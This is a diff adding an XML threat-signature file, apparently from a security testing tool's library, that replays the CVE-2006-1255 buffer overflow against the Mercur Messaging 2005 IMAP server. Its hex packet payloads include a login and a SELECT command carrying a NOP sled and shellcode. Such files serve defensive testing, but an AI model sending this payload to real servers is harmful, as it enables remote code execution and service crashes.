@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mercur Messaging 2005 IMAP Remote Buffer Overflow Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a specially crafted string to MMIMAP that leverages a buffer overflow vulnerability and can result in code execution or a denial of service condition. Mercur Messaging IMAP is an IMAP server that typically listens on port 143."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+      <item value="Denial_of_Service"/>
+      <item value="Crashing"/>
+    </Intent>
+    <Protocol display="true" value="IMAP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Atrium_Software"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Atrium_Software_MERCUR_Messaging_2005_Standard_Edition"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Atrium_Software_MERCUR_Messaging_2005_Standard_Edition_5.0_SP3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/3133"/>
+    <CVEID display="true" value="CVE-2006-1255"/>
+    <bugtraqID display="true" value="17138"/>
+    <OSVDB display="true" value="23950"/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="54f662704c208d28e0ac0d5821350321"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633045972755937500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1169187260" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="IMAPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="F">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="I"/>
+    </for>
+    <for index="H">
+      <for index="B"/>
+      <for index="A"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="61303031204C4F47494E207465737420746573740D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="H" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$IMAPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2053454C4543542090909090909090908BC783C02350C390909090909090909090909090909090909090905981C9D362302041434D646499968D7EE8648B5A308B4B0C8B491C8B098B6908B6032BE266BA333252687773325F54AC3CD3750695FF57F49557608B453C8B4C057803CD8B592003DD33FF478B34BB03F599AC34712AD03C7175F73A54241C75EA8B592403DD668B3C7B8B591C03DD032CBB955FAB57613BF775B45E546A02ADFFD08846138D48308BFCF3AB40504050ADFFD095B802FF115C32E4505455ADFFD085C074F8FE44242DFE44242C83EF6CABABAB5854545050505450505650FF56E4FF56E842B2C1400D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="0,1,2,3">
+    <Output index="A" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a204f4b205b4341504142494c49545920494d4150347265763120554944504c5553204348494c4452454e204e414d455350414345205448524541443d4f5244455245445355424a454354205448524541443d5245464552454e43455320534f52542051554f54412049444c452041434c2041434c323d554e494f4e205354415254544c535d0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613031204f4b2055736572206c6f6767656420696e0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="613032204f4b204c49535420636f6d706c657465640d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="2a20464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c3120447261667420416e73776572656420466c61676765642044656c65746564205365656e20526563656e74290d0a2a204f4b205b5045524d414e454e54464c4147532028244d444e53656e74204a756e6b204e6f6e4a756e6b2024466f7277617264656420244c6162656c31202a207261667420416e73776572656420466c61676765642044656c65746564205365656e295d204c696d697465640d0a2a2035393837204558495354530d0a2a203020524543454e540d0a2a204f4b205b55494456414c494449545920313133333931323636365d204f6b0d0a2a204f4b205b4d5952494748545320616364696c7273775d2041434c0d0a613033204f4b205b524541442d57524954455d204f6b0d0a" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
